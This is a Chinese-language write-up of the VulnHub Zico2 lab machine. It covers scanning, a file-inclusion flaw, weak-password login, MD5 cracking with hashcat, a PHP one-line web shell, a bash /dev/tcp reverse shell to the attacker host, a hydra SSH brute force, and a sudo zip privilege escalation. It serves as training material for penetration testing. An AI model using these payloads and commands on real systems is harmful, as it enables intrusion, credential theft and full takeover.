# Zico2

## 基本信息

- 题目名称：Zico2
- 题目链接：https://www.vulnhub.com/entry/zico2-1,210/
- 考点清单：目录扫描、文件包含、弱口令、MD5 Hash 破解、PHP 一句话木马、反弹 Shell、SSH 爆破、Sudo 提权（zip）
- 工具清单：Nmap、WhatWeb、Dirb、Hashcat、Hydra、Searchsploit

## 1. 信息收集

###  1.1 主机发现&端口扫描

```shell
nmap -sn 192.168.56.1/24 --min-rate 1000 -r
IP=192.168.56.108
nmap -A $IP $(nmap -sS -p- -PN -r --min-rate 8888 $IP | grep "/tcp\|/udp" | awk -F '/' '{print $1}' | tr '\n' ',') -T5 -oN nmap.txt
```

扫描发现 80 端口开放，运行 Apache 2.2.22 服务

### 1.2 Apache 漏洞检索

通过 Searchsploit 检索 Apache 2.2 相关漏洞

```shell
searchsploit apache 2.2
```

发现 `Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak`

提取漏洞利用脚本

```shell
searchsploit apache -m 42745
```

根据脚本运行报错判断其为 Python 3 脚本，进一步分析源码并尝试运行

```shell
python3 42745.py -h 192.168.56.108
```

虽然获取到了请求方法，但由于没有 PUT 方法，无法通过该漏洞上传文件，暂时放弃此利用方向

## 2. Web 渗透

### 2.1 网站信息收集

访问 80 端口，发现网站标题为 `ZICO'S SHOP`

根据网站名称猜测 `zico` 可能是系统用户，将其保存至 `user.txt`，作为后续用户名字典

使用 WhatWeb 识别 Web 服务

```shell
whatweb 192.168.56.108
```

未发现明显可利用的信息

### 2.2 文件包含漏洞探测

浏览网站时发现一个页面，其 URL 为

```
http://192.168.56.108/view.php?page=tools.html
```

![image-20261116135153697](0x13%20-%20Zico2/image-20261116135153697.png)

参数 `page` 疑似用于**动态加载文件**，尝试目录穿越读取系统文件

```
http://192.168.56.108/view.php?page=../../../../etc/passwd
```

![image-20261116135239911](0x13%20-%20Zico2/image-20261116135239911.png)成功读取 `/etc/passwd`，确认存在文件包含漏洞

### 2.3 目录扫描

尝试访问 `/robots.txt`，未发现有效信息

使用 Dirb 进行目录扫描

```shell
dirb http://192.168.56.108/
```

扫描发现 `/dbadmin` 目录

访问后发现数据库管理界面，尝试使用弱口令 `admin` 登录成功

### 2.4 数据库信息收集与 Hash 破解

登录数据库管理界面后，发现两个用户及其对应的 MD5 Hash

分别提取用户名和 Hash，保存至：

- `user.txt`：用户名
- `hash.txt`：MD5 Hash

首先尝试使用 John 破解

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

未获得有效结果，改用 Hashcat

```shell
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

> 参数说明：
>
> - `-a 0`：字典攻击模式
> - `-m 0`：MD5 Hash 类型

成功破解出对应明文密码，将结果保存至 `pass.txt`

> 补充：可以使用以下命令查看 Hashcat 的基准测试速度
>
> ```shell
> hashcat -b
> ```



### 2.5 写入 PHP 一句话木马

在数据库管理界面，通过向数据库添加字段，写入 PHP 一句话木马

```php
<?php system($_GET[0]); phpinfo(); ?>
```

![1794809498307](0x13%20-%20Zico2/1794809498307.png)

随后利用前面发现的 `view.php` 文件包含漏洞，包含该数据库

```
http://192.168.56.108/view.php?page=../../../../.../../../usr/databases/test_users
```

![1794809500916](0x13%20-%20Zico2/1794809500916.png)

成功触发 `phpinfo()`

通过 `phpinfo()` 搜索 `disable_functions`，发现 `system` 未被禁用

至此，获得 Web 命令执行点

### 2.6 反弹 Shell

利用命令执行点执行 Bash 反弹 Shell 命令

```
/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.1/2233 0>&1'
```

攻击机开启监听

```
nc -lvnp 2233
```

成功获得反弹 Shell

![image-20261116141518643](0x13%20-%20Zico2/image-20261116141518643.png)

### 2.7 Shell 交互优化

当前 Shell 交互体验较差，使用 Python 的 PTY 模块获取交互式终端

```
which python
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

## 3. 本地信息收集与用户凭据获取

### 3.1 用户信息收集

查看具有登录 Shell 的用户

```
cat /etc/passwd | grep home
```

发现只有 `zico` 用户具有正常的登录 Shell

### 3.2 SUID 与 Sudo 权限检查

检查当前用户的 Sudo 权限

```
sudo -l
```

需要提供当前用户密码，暂时无法利用

进一步检查 SUID 文件

```
find / -perm -u=s -type f 2>/dev/null
```

未发现明显的提权利用点

### 3.3 WordPress 配置文件泄露

继续检查系统目录，在 `zico` 的家目录中发现 WordPress 项目

查看配置文件

```
cat ~/wordpress/wp-config.php
```

发现数据库连接配置中包含用户名和密码

```
define('DB_USER', 'zico');
define('DB_PASSWORD', '...');
```

其中用户名为 `zico`，获得一组新的密码，将其补充至 `pass.txt`

### 3.4 SSH 凭据爆破

利用已经收集到的用户名和密码字典，对 SSH 服务进行爆破

```
hydra ssh://192.168.56.108 -L user.txt -P pass.txt
```

成功获得 `zico` 用户的 SSH 登录密码

使用 SSH 登录

```
ssh zico@192.168.56.108
```

成功切换至 `zico` 用户

## 4. Sudo 提权

### 4.1 Sudo 权限检查

登录 `zico` 用户后，重新检查 Sudo 权限

```
sudo -l
```

发现当前用户可以免密码执行 `tar` 和 `zip`

其中 `zip` 可以通过 `-T` 指定测试命令，并利用 `-TT` 指定测试时执行的命令，从而实现命令执行

### 4.2 利用 zip 提权

使用以下命令构造提权利用

```
sudo zip 1.zip /etc/hosts -T -TT 'sh #'
```

> 参数说明：
>
> - `-T`：创建压缩包后执行完整性测试
> - `-TT`：指定测试时使用的命令
> - `sh #`：执行 Shell，`#` 将后续可能追加的参数作为注释处理

成功获得 root Shell，完成提权

## 5. 总结

本题主要利用 Web 文件包含与数据库管理权限组合获取初始命令执行能力，随后通过配置文件泄露获得用户凭据，最终利用 Sudo 授权的 zip 命令完成提权

核心利用链：

```
Nmap 主机与端口扫描
        |
        v
Apache 服务识别
        |
        v
Web 目录扫描
        |
        v
/dbadmin 弱口令登录
        |
        v
获取用户 MD5 Hash
        |
        v
Hashcat 字典破解
        |
        v
修改 test_db.php 写入一句话木马
        |
        v
view.php 文件包含
        |
        v
system() 命令执行
        |
        v
反弹 Shell（www-data）
        |
        v
读取 WordPress wp-config.php
        |
        v
获取 zico 用户密码
        |
        v
SSH 登录 zico
        |
        v
sudo -l 发现 zip
        |
        v
sudo zip -T -TT
        |
        v
root
```

**核心考点：**

1. 文件包含漏洞与 PHP 命令执行的组合利用
2. 数据库管理界面弱口令及文件修改
3. MD5 Hash 字典破解
4. WordPress 配置文件敏感信息泄露
5. Hydra SSH 凭据爆破
6. Sudo 配置错误与 zip 提权（GTFOBins）